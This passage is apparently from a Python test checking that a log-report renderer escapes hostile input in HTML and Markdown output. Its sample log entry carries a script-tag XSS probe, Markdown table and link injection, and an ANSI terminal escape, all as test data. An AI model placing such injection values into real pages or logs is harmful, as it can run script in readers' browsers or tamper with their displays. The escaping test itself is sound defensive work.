        {"time": "2026-11-11T10:00:00Z", "event": "denied", "host": "<script>alert(1)</script>|x](#y)",
         "reason": "line\nbreak\x1b[31m", "destination": "192.0.2.1:443"}])
    data = R.gather(R.resolve(log_dir=logs), live=False)
    page = R.render(data, "html")
    assert "<script>alert" not in page and "&lt;script&gt;" in page
    text = R.render(data, "md")
    assert not re.search(r"(?<!\\)\]\(#y\)", text) and "\x1b" not in text and "\x1b" not in page
    assert "\\<script\\>" in text and "\\|x" in text  # no markup, no cell of its own
